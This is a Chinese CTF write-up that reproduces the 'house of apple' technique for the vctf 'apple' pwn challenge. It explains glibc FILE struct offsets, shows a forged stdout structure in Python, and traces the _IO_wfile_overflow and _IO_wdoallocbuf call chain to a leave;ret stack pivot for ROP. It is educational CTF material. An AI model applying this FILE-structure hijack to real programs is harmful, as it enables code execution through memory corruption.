---
date:2024-5-15
tag:
  - pwn
  - io
  - house of apple
---

# vctf apple 复现(apple的通用模板)

> 本文参考的是[Arahat0](https://passport.kanxue.com/user-center-964693.htm) 师傅的脚本 这里主要介绍一下vctf apple的house of apple部分的思路 与常规的house of apple不同这里将`_wide_data`指向劫持的`FILE`结构体加减偏移 来让脚本更加可以移植 最后实现栈迁移打ROP链的操作

前情提要:要结合上一篇文章:[[原创\]vctf apples leak libc操作复现(高版本libc overlapping)-Pwn-看雪-安全社区|安全招聘|kanxue.com](https://bbs.kanxue.com/thread-281083.htm)来观看 在上一篇文章中我们通过较为复杂的overlapping实现了heap和libc的泄露 接下来我们通过劫持fd来实现一次任意写

## 条件

- 泄露libc地址和堆地址
- 能劫持`stdout`结构体实现对`stdout`结构体的覆写
- 能触发puts函数

## 属性的偏移

```c
0x0:'_flags',
0x8:'_IO_read_ptr',
0x10:'_IO_read_end',
0x18:'_IO_read_base',
0x20:'_IO_write_base',
0x28:'_IO_write_ptr',
0x30:'_IO_write_end',
0x38:'_IO_buf_base',
0x40:'_IO_buf_end',
0x48:'_IO_save_base',
0x50:'_IO_backup_base',
0x58:'_IO_save_end',
0x60:'_markers',
0x68:'_chain',
0x70:'_fileno',
0x74:'_flags2',
0x78:'_old_offset',
0x80:'_cur_column',
0x82:'_vtable_offset',
0x83:'_shortbuf',
0x88:'_lock',
// 以上是一个_IO_FILE结构体包含的内容
0x90:'_offset',
0x98:'_codecvt',
0xa0:'_wide_data',
0xa8:'_freeres_list',
0xb0:'_freeres_buf',
0xb8:'__pad5',
0xc0:'_mode',
0xc4:'_unused2',
// 以上是 _IO_FILE_complete结构体包含的内容
0xd8:'vtable',
// 以上是 _IO_FILE_plus结构体部分
0xe0:'_wide_vtable'
// _wide_vtable是_IO_wide_data的最后一个属性
```

## 各大结构体

> 建议和上面的偏移结合起来看 还是比较详细的

```c
struct _IO_FILE
{
  int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */

  /* The following pointers correspond to the C++ streambuf protocol. */
  char *_IO_read_ptr;	/* Current read pointer */
  char *_IO_read_end;	/* End of get area. */
  char *_IO_read_base;	/* Start of putback+get area. */
  char *_IO_write_base;	/* Start of put area. */
  char *_IO_write_ptr;	/* Current put pointer. */
  char *_IO_write_end;	/* End of put area. */
  char *_IO_buf_base;	/* Start of reserve area. */
  char *_IO_buf_end;	/* End of reserve area. */

  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;

  int _fileno;
  int _flags2;
  __off_t _old_offset; /* This used to be _offset but it's too small.  */

  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};
struct _IO_FILE_plus
{
  FILE file;
  const struct _IO_jump_t *vtable;
};

struct _IO_FILE_complete
{
  struct _IO_FILE _file;
#endif
  __off64_t _offset;
  /* Wide character stream stuff.  */
  struct _IO_codecvt *_codecvt;
  struct _IO_wide_data *_wide_data;
  struct _IO_FILE *_freeres_list;
  void *_freeres_buf;
  size_t __pad5;
  int _mode;
  /* Make sure we don't get into trouble again.  */
  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];
};
struct _IO_FILE_complete_plus
{
  struct _IO_FILE_complete file;
  const struct _IO_jump_t *vtable;
};
```

## exp中伪造

> 先这里给出exp中伪造的`stdout`结构体 方便我们后面分析

```python
FILE = IO_FILE_plus_struct()
FILE.flags = 0
FILE._IO_read_ptr = pop_rbp
FILE._IO_read_end = heap_addr + 0x470 - 8
FILE._IO_read_base = leave_ret
FILE._IO_write_base = 0
FILE._IO_write_ptr = 1
FILE._lock = heap_addr - 0xc30
FILE.chain = leave_ret
FILE._codecvt = stdout_addr
FILE._wide_data = stdout_addr - 0x48
FILE.vtable = libc.sym['_IO_wfile_jumps'] + libc_base - 0x20
```

## 动调

目的:通过puts函数触发`_IO_wfile_overflow`函数来调用`_IO_wdoallocbuf`函数	

![image-20240515214202580](https://awaqwqa.github.io/img/io_sturct/image-20240515214202580.png)

### 正常的调用链

> 为了搞清楚劫持原理 这里我们分析puts函数的源码

- puts中调用`_IO_file_xsputn`（stdout->vatble(0xd8)->_IO_file_xsputn(0x38)）

  ![image-20240516010449032](https://awaqwqa.github.io/img/io_sturct/image-20240516010449032.png)

  - `r14`此时为 也就是_IO_file_jumps+0x38的位置

    ![image-20240516012651838](https://awaqwqa.github.io/img/io_sturct/image-20240516012651838.png)

  - 而`r14`是通过`mov     r14, [rdi+0D8h]`取出来的  rdi为`_IO_2_1_stdout_` 根据`0xd8`偏移可以知道是`vatble`属性 

    ![image-20240516012935973](https://awaqwqa.github.io/img/io_sturct/image-20240516012935973.png)

- 然后调用`_IO_file_overflow`

  ![image-20240516010742819](https://awaqwqa.github.io/img/io_sturct/image-20240516010742819.png)

- 然后走向`_IO_do_write`

  ![image-20240516010911530](https://awaqwqa.github.io/img/io_sturct/image-20240516010911530.png)

### _IO_wfile_jumps结构体

> 所以要调用`_IO_wfile_overflow`则需要vatble+0x38位置为`_IO_wfile_jumps`+24 所以这里控制vtable为`_IO_wfile_jumps`-0x20

![image-20240516013411102](https://awaqwqa.github.io/img/io_sturct/image-20240516013411102.png)

```c

struct _IO_jump_t
{
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn);
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
};

```

### `_IO_wfile_overflow`函数

> 我们最终是想要调用`_IO_wdoallocbuf`函数

```c
wint_t
_IO_wfile_overflow (FILE *f, wint_t wch)
{
  if (f->_flags & _IO_NO_WRITES) /* SET ERROR */
    {
      f->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return WEOF;
    }
  /* If currently reading or no buffer allocated. */
  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0)
    {
      /* Allocate a buffer if needed. */
      if (f->_wide_data->_IO_write_base == 0)
	{
	  _IO_wdoallocbuf (f);
	  _IO_free_wbackup_area (f);
	  _IO_wsetg (f, f->_wide_data->_IO_buf_base,
		     f->_wide_data->_IO_buf_base, f->_wide_data->_IO_buf_base);

	  if (f->_IO_write_base == NULL)
	    {
	      _IO_doallocbuf (f);
	      _IO_setg (f, f->_IO_buf_base, f->_IO_buf_base, f->_IO_buf_base);
	    }
	}
      else
	{
	  /* Otherwise must be currently reading.  If _IO_read_ptr
	     (and hence also _IO_read_end) is at the buffer end,
	     logically slide the buffer forwards one block (by setting
	     the read pointers to all point at the beginning of the
	     block).  This makes room for subsequent output.
	     Otherwise, set the read pointers to _IO_read_end (leaving
	     that alone, so it can continue to correspond to the
	     external position). */
	  if (f->_wide_data->_IO_read_ptr == f->_wide_data->_IO_buf_end)
	    {
	      f->_IO_read_end = f->_IO_read_ptr = f->_IO_buf_base;
	      f->_wide_data->_IO_read_end = f->_wide_data->_IO_read_ptr =
		f->_wide_data->_IO_buf_base;
	    }
	}
      f->_wide_data->_IO_write_ptr = f->_wide_data->_IO_read_ptr;
      f->_wide_data->_IO_write_base = f->_wide_data->_IO_write_ptr;
      f->_wide_data->_IO_write_end = f->_wide_data->_IO_buf_end;
      f->_wide_data->_IO_read_base = f->_wide_data->_IO_read_ptr =
	f->_wide_data->_IO_read_end;

      f->_IO_write_ptr = f->_IO_read_ptr;
      f->_IO_write_base = f->_IO_write_ptr;
      f->_IO_write_end = f->_IO_buf_end;
      f->_IO_read_base = f->_IO_read_ptr = f->_IO_read_end;

      f->_flags |= _IO_CURRENTLY_PUTTING;
      if (f->_flags & (_IO_LINE_BUF | _IO_UNBUFFERED))
	f->_wide_data->_IO_write_end = f->_wide_data->_IO_write_ptr;
    }
  if (wch == WEOF)
    return _IO_do_flush (f);
  if (f->_wide_data->_IO_write_ptr == f->_wide_data->_IO_buf_end)
    /* Buffer is really full */
    if (_IO_do_flush (f) == EOF)
      return WEOF;
  *f->_wide_data->_IO_write_ptr++ = wch;
  if ((f->_flags & _IO_UNBUFFERED)
      || ((f->_flags & _IO_LINE_BUF) && wch == L'\n'))
    if (_IO_do_flush (f) == EOF)
      return WEOF;
  return wch;
}
```

- 所以我们需要满足条件:

  - f->_flags & _IO_NO_WRITES为0

  - (f->_flags & _IO_CURRENTLY_PUTTING) == 0

    - 也就是_flags位置为0

  - f->_wide_data(0xa0)->_IO_write_base(0x20) == 0

    ![image-20240515224054184](https://awaqwqa.github.io/img/io_sturct/image-20240515224054184.png)

### `_IO_wdoallocbuf`函数

```c
void  _IO_wdoallocbuf(FILE *fp)
{
  // _wide_data -> _IO_buf_base 不能为1
  if (fp->_wide_data->_IO_buf_base)
    return;
  // fp->_flags 二位得为0
  if (!(fp->_flags & _IO_UNBUFFERED)){
        // 利用这里的函数调用
    if ((wint_t)_IO_WDOALLOCATE(fp) != WEOF)
      return;
  }
  _IO_wsetb(fp, fp->_wide_data->_shortbuf,fp->_wide_data->_shortbuf + 1, 0);
}
```

- 这里我们要执行`_IO_WDOALLOCATE`从而调用我们伪造的函数 所以我们这里需要过掉保护`fp->_wide_data->_IO_buf_base`和`!(fp->_flags & _IO_UNBUFFERED)` 

  - 也就是`_wide_data`(0xa0)的`_IO_buf_base`(0x38)偏移位置要为0

    ![image-20240515215042717](https://awaqwqa.github.io/img/io_sturct/image-20240515215042717.png)

### 触发`_IO_WDOALLOCATE(fp)`

> 这里等效为: *(fp->_wide_data(0xa0)->_wide_vtable(0xe0) + 0x68)(fp)

![image-20240515215803234](https://awaqwqa.github.io/img/io_sturct/image-20240515215803234.png)

- 所以最终就成功调用leave retn指令 

### 栈迁移

- 我们先看汇编代码
  - ![image-20240515220153354](https://awaqwqa.github.io/img/io_sturct/image-20240515220153354.png)

- 可以看见这里把`rdi`赋值给了`rbx` 而根据前面代码可以知道rdi是`_io_wdoallocbuf`的参数 也就是fp也就是`_IO_2_1_stdout_` 

- 那么回顾我们前面的payload

  ```c
  FILE.flags = 0
  FILE._IO_read_ptr = pop_rbp
  FILE._IO_read_end = heap_addr + 0x470 - 8
  FILE._IO_read_base = leave_ret
  ```

  - ![image-20240515221327579](https://awaqwqa.github.io/img/io_sturct/image-20240515221327579.png)

- 然后我们`pop_rbp`让`rbp`变成我们存放payload的chunk内容然后再通过leave ret让rsp也移动到我们的chunk上 实现栈迁移 然后我们就可以愉快打rop链了
